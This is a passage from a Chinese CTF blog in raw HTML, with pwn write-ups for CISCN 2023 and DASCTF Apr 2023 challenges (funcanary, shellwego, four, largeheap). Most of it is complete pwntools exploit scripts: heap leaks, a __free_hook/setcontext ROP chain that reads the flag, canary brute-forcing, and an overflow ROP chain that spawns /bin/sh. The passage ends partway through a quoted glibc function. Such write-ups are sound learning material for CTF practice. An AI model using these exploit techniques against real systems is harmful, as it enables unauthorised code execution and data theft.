class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0xd8</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x68</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">r(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x9a0</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x1ecb00</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">ret = libc_base + <span class="number">0x22679</span></span><br><span class="line">op = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">rd = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pt = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext_61 = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line"><span class="comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line">magic = libc_base +  + <span class="number">0x151990</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xd8</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xd8</span>, p64(magic))</span><br><span class="line"></span><br><span class="line">pld = p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x310</span>)</span><br><span class="line">pld += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(setcontext_61)</span><br><span class="line">pld += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xa0</span> - <span class="built_in">len</span>(pld))</span><br><span class="line">pld += p64(heap_base + <span class="number">0x460</span>) + p64(ret) </span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, pld)</span><br><span class="line"></span><br><span class="line">orw = p64(p_rdi_r) + p64(heap_base + <span class="number">0x460</span> + <span class="number">0x88</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(op)</span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x1000</span>)</span><br><span class="line">orw += p64(p_rdx_r) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(rd)</span><br><span class="line">orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x1000</span>)</span><br><span class="line">orw += p64(pt)</span><br><span class="line">orw += <span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0</span>, orw)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;tel $rebase(0x000000000000A460) 0x10&#x27;)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h3><p>由于 fork 后子进程的 canary 不会变化，所以可以爆破，同时存在后门函数，但是需要爆破一位。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./funcanary&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./funcanary&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        tmp = pld + p8(j)</span><br><span class="line">        s(tmp)</span><br><span class="line">        rs = ru(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;have fun&#x27;</span> <span class="keyword">in</span> rs:</span><br><span class="line">            canary += j &lt;&lt; (<span class="number">8</span> * i)</span><br><span class="line">            pld += p8(j)</span><br><span class="line">            lg(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000001229 system(&quot;/bin/cat flag&quot;)</span></span><br><span class="line">pld += <span class="string">b&#x27;deadbeef&#x27;</span> + <span class="string">b&#x27;\x31&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    tmp = pld + p8((i &lt;&lt; <span class="number">4</span>) + <span class="number">2</span>)</span><br><span class="line">    s(tmp)</span><br><span class="line">    rs = ru(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> rs:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="shellwego"><a href="#shellwego" class="headerlink" title="shellwego"></a>shellwego</h3><p>题目的难度在于逆向和寻洞，程序似乎是实现了一个自定义的终端，是用 golang 写的而且去除了符号表，有点难看。首先是分享一下我用肝硬逆的过程，然后再学习一下恢复符号表的技术。</p>
<h4 id="无符号表"><a href="#无符号表" class="headerlink" title="无符号表"></a>无符号表</h4><p>尝试执行一些命令，发现始终提示我们需要一个证书。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230601194847287.png" alt="image-20230601194847287"></p>
<p>在 IDA 中交叉引用找到主逻辑。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230601195012053.png" alt="image-20230601195012053"></p>
<p>通过调试我们找到了处理我们输入命令的函数<code>sub_4C1900</code>，并发现了一些命令。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230601195206462.png" alt="image-20230601195206462"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls cat whoami cert echo exit cd</span><br></pre></td></tr></table></figure>

<p>根据提示尝试输入 cert 命令，发现需要参数，通过调试发现需要三个参数（包含命令本身在内），而且第一个参数的长度是 9 并且其内容必须是<code>nAcDsMicN</code>，只有这样才能进入第三个参数的判断，具体的逻辑图如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230601195717557.png" alt="image-20230601195717557"></p>
<p>之后程序会判断第三个参数是什么牛马，进入<code>sub_4C14A0</code>函数，发现检查成功后会提示我们可以尝试更多的命令，同时我们对这个函数进行反编译查看，最终的目的就是要成功进入 if 的分支当中。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230601200023148.png" alt="image-20230601200023148"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230601200201945.png" alt="image-20230601200201945"></p>
<p>根据调试的结果进行分析，发现函数的参数并不是从 rdi 寄存器开始算起。首先第一个函数<code>sub_476B00</code>，进入函数会发现 RC4 加密的特征，调试进行分析，发现该函数的参数是将密钥<code>F1nallB1rd3K3y</code>和我们输入的第三个参数拼接形成的，同时该函数的返回值是 RC4 打乱后的S盒，存储在 rax 寄存器里面，如下图所示（<strong>我这里的第三个参数是aaaaaaaaaa</strong>）：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230603180310326.png" alt="image-20230603180310326"></p>
<p>然后第二个函数，通过猜测和调试，发现是根据生成的S盒对我们输入的值进行 RC4 加密，密文存储在 rbx 寄存器里。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230603180546199.png" alt="image-20230603180546199"></p>
<p>第三个函数，通过调试，发现传入了 base64 的字符表，存储在 rax 寄存器当中，猜测是 base64 加密。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230603180745385.png" alt="image-20230603180745385"></p>
<p>通过上述调试的过程我们理清了加密的过程，一次 RC4（密钥为<code>F1nallB1rd3K3y</code>），一次 base64，密文为<code>JLIX8pbSvYZu/WaG</code>。利用工具解密得到我们输入的第三个参数是<code>S33UAga1n@#!</code>。</p>
<p>尝试更多的命令，发现只有 ls 是真实的；cat 只能是<code>cat flag</code>，而且是个假的；whoami 也没啥卵用；echo 也只能将字符串输出到终端上。看看 WP 才发现洞在 echo 命令当中，存在一个溢出的问题，尝试逆向一波。最终发现 echo 命令的处理在函数<code>sub_4C1720</code>中。</p>
<p>通过调试，找到函数的逻辑。首先会字符串<code>unk_func0b04:</code>和我们输入的拼接起来，并且将 echo 参数中的空格给消除掉（<strong>如果连续输入的字节数大于 0x200 那么会直接退出</strong>），然后会进入一个循环，将上述拼接的字符串逐个读入到变量 v19 上，如果遇到<code>+</code>，那么就跳过不予读取。发现能够读取的最大字节数是 0x400 个字节，存在溢出。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230605194500695.png" alt="image-20230605194500695"></p>
<p>重要的两段汇编如下，其中 rbx 为拼接字符串的地址，rax 为循环的次数，程序会将字符串逐字节读入<code>rsp+rax+298h+var_230</code>上。<strong>这里还需要注意一个问题，在溢出的过程中，会将 rbx 中的数据给覆盖掉，也就是上文的 v23 变量，也就是说程序会找不到拼接字符串的地址，需要我们使用加号绕过。</strong></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230605195351252.png" alt="image-20230605195351252"></p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./shellwego&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./shellwego&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shellwego&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">p_rsi_r = <span class="number">0x000000000041e818</span></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000444fec</span></span><br><span class="line">p_rdx_r = <span class="number">0x000000000049e11d</span></span><br><span class="line">p_rax_r = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall_r = <span class="number">0x00000000004636e9</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;ciscnshell$ &quot;</span>, <span class="string">b&quot;cert nAcDsMicN S33UAga1n@#!&quot;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;echo &#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + <span class="string">b&#x27; &#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x103</span> + <span class="string">b&#x27;+&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(<span class="number">0x5a0000</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">0x30</span>)</span><br><span class="line">pld += p64(syscall_r)</span><br><span class="line">pld += p64(p_rax_r) + p64(<span class="number">59</span>)</span><br><span class="line">pld += p64(p_rdi_r) + p64(<span class="number">0x5a0000</span>)</span><br><span class="line">pld += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(p_rdx_r) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(syscall_r)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x00000000004C18A0&#x27;)</span></span><br><span class="line">sla(<span class="string">&quot;nightingale# &quot;</span>, pld)</span><br><span class="line">s(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a>恢复符号表</h4><p>找到一个比较好的项目，是基于 golang_loader_assist 和 jeb-golang-analyzer 开发的一款工具，直接在 IDA 中<code>Alt+F7</code>调用 go_parser.py 脚本就可以自动解析。</p>
<blockquote>
<p><a href="https://github.com/0xjiayu/go_parser">GitHub - 0xjiayu&#x2F;go_parser: Yet Another Golang binary parser for IDAPro</a></p>
</blockquote>
<p>经过处理可以找到入口<code>main_main</code>，不过还是要结合汇编。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230626174634443.png" alt="image-20230626174634443"></p>
<p>同时在后面的加密过程中，也给我们标明了加密算法。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230626175229497.png" alt="image-20230626175229497"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 DASCTF Apr</title>
    <url>/2023/05/17/CTF/2023DASCTF%20Apr/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="four"><a href="#four" class="headerlink" title="four"></a>four</h3><p>利用的是<code>*** stack smashing detected ***: argv[0]</code>泄露信息，其中<code>argv[0]</code>是我们的程序名，是保存在栈上的。</p>
<p>利用流程：</p>
<ul>
<li>首先是利用功能二进行<code>flag\x00</code>的栈喷射。</li>
<li>利用功能三读取 flag，其中 open 的参数就是上述残留在栈中的字符串。</li>
<li>利用功能四进行 read 的操作，通过逆向程序的功能，发现可以将 flag 读取到 bss 上（程序未开启 PIE）。</li>
<li>利用功能五进行栈溢出，使得<code>argv[0]</code>是存有 flag 的 bss 地址。</li>
<li>而功能一是误导选项，会关闭标准错误使得无法泄露。</li>
</ul>
<span id="more"></span>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;your choice : &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;there will be no overflow&quot;</span>, <span class="built_in">str</span>(<span class="number">0x5FEF</span>))</span><br><span class="line">sla(<span class="string">&quot;doesn&#x27;t seem to be useful&quot;</span>, <span class="string">b&#x27;aa&#x27;</span> + <span class="string">b&#x27;flag\x00&#x27;</span> * (<span class="number">0x5FEF</span> // <span class="number">5</span> - <span class="number">1</span>))</span><br><span class="line">sa(<span class="string">&quot;Really?&quot;</span>, <span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;your choice : &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Enter level:&quot;</span>, <span class="string">b&#x27;3&#x27;</span>);</span><br><span class="line">sla(<span class="string">&quot;Enter mode:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>);</span><br><span class="line">sla(<span class="string">&quot;Enter X:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>);</span><br><span class="line">sa(<span class="string">&quot;Enter a string: &quot;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;please input filename&quot;</span>, <span class="string">b&#x27;output.txt&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;1. yes\n2.no&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;your choice : &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;info&gt;&gt;&quot;</span>, <span class="string">b&#x27;~3&gt;@d*&gt;:\x60\x21\x21\x00&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x0000000000401456\n&#x27;)</span></span><br><span class="line">sla(<span class="string">&quot;your choice : &quot;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;eturn address&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x118</span> + p64(<span class="number">0x602121</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="largeheap"><a href="#largeheap" class="headerlink" title="largeheap"></a>largeheap</h3><p>一道很抽象的堆题，题目流程不是很难，主要是利用了两次的任意地址写一个字节的 \x00，和一次修改堆内容。最后是用 IO 来打，通过修改 topchunk 的 size 位来触发<code>__malloc_assert</code>，和去年的强网很像。</p>
<p>主要的难点是如何泄露地址。其实在比赛的时候想到了是利用 stdout 来泄露地址的，但是想到不是<code>_flags</code>位需要为 0xFBAD1800 吗？后来就放弃了，看过 wp 才发现并不需要，我们只是走了另外的一个分支。</p>
<p>这里分析一下源码。调试下来发现<code>_flag</code>的值是 0xfbad2087。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// _flag = 0xfbad2087</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">      <span class="comment">// #define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)		<span class="comment">// 进入该分支</span></span><br><span class="line">      <span class="comment">// #define _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)		<span class="comment">// 绕过</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))			<span class="comment">// 绕过</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	      f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | 